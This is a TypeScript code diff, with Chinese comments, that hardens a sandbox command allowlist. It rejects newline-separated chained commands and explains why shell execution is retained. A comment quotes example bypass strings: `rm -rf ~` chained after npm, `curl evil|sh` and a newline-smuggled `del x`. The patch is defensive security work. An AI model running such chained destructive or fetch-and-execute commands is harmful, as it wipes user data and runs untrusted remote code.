@@ -461,6 +461,15 @@ export function evaluateCommandAllowlist(
   // undefined / 空数组 = 不检查(旧语义,不得改动:全仓现有免确认面依赖它)
   if (!allowlist || allowlist.length === 0) return null;
 
+  // F-073 残留格(2026-11-12 实测):换行是 POSIX sh 与 Windows cmd **两家**的段分隔符,
+  // 而 tokenizer 只把 `\n`/`\r` 当空白(flushToken)⇒ `git status<换行>del x` 被切成
+  // 单段 argv ['git','status','del','x'],首 token 合法即整行放行,shell 真跑的是两条命令。
+  // 这里在进 tokenizer 前判死:只允许"一行命令"(尾部换行/空行不算第二段),宁可窄一点。
+  const commandLines = commandLine.split(/\r\n|\r|\n/).filter((line) => line.trim().length > 0);
+  if (commandLines.length > 1) {
+    return 'command_not_allowed: <换行分隔的多条命令>';
+  }
+
   // 白名单是"这条命令整体只能跑这些程序",不是"首 token 恰好叫这些名字"。
   // 旧实现只取 `extractCommandName`(首个 token)便放行,于是
   //   `npm run build; rm -rf ~`、`npm test && curl evil|sh`、`npm test $(rm -rf ~)`
@@ -475,7 +484,7 @@ export function evaluateCommandAllowlist(
   if (tokenized.segments.length === 0) {
     return `command_not_allowed: <无法解析命令名>`;
   }
-  for (const segment of tokenized.segments) {
+  for (const [index, segment] of tokenized.segments.entries()) {
     if (segment.writesTo.length > 0 || segment.readsFrom.length > 0) {
       return `command_not_allowed: <重定向不给白名单放行>`;
     }
@@ -487,7 +496,9 @@ export function evaluateCommandAllowlist(
     }
     const cmdName = commandNameFromValue(segment.argv[0]!.value);
     if (!cmdName || !isCommandAllowed(cmdName, allowlist)) {
-      return `command_not_allowed: ${cmdName || '<无法解析命令名>'}`;
+      // 多段命令行点名"第几段的哪个命令",免得读者以为被拒的是首命令
+      const segmentTag = tokenized.segments.length > 1 ? `<命令链第${index + 1}段的非白名单命令> ` : '';
+      return `command_not_allowed: ${segmentTag}${cmdName || '<无法解析命令名>'}`;
     }
   }
   return null;
@@ -1006,6 +1017,12 @@ export function runSandboxed(commandLine: string, opts: SandboxOptions): Sandbox
     encoding: 'utf-8',
     timeout: timeoutMs,
     maxBuffer: maxOutput,
+    // F-073:这里保留 shell,理由写死免得日后被"顺手改成 shell:false"打断合法命令 ——
+    // 受限档(limited/trusted/readonly)到这一步前已过 evaluateCommandAllowlist 的整行结构求值:
+    // 只放行单行、无重定向/无命令替换、且**每一段**命令都在白名单内的命令行,
+    // shell 再解释一遍也变不出白名单之外的第二段。Windows 上 shell 还不能去掉:
+    // echo/dir 是 cmd 内建、npm/npx/pnpm 是 .cmd 垫片,shell:false 会直接 ENOENT/ENOEXEC。
+    // open/full 档按档位定义"不限命令",整串交给 shell 是它们的既有契约。
     shell: true,
     // 2026-10-04:不吃的子进程必须给 stdio,否则本机报 spawnSync EBUSY
     stdio: ['ignore', 'pipe', 'pipe'],
@@ -1154,6 +1171,9 @@ export function runSandboxedAsync(commandLine: string, opts: SandboxOptions): Sa
 
   const spawnOpts: SpawnOptions = {
     cwd: opts.cwd,
+    // F-073:shell 策略与同步路径逐字同一口径(见 runSandboxed 的 spawnOpts 注释)——
+    // 受限档的注入面在 precheckSandbox → evaluateCommandAllowlist 处判死,这里保留 shell
+    // 是为了 Windows 内建命令与 .cmd 垫片可执行;open/full 档本就"不限命令"。
     shell: true,
     // 2026-10-21:stdin 无人写(输出全走 stdout/stderr 流式收集)⇒ ignore;
     // 三通道全 pipe 会被 stdio 纪律门判成病(且没必要)。
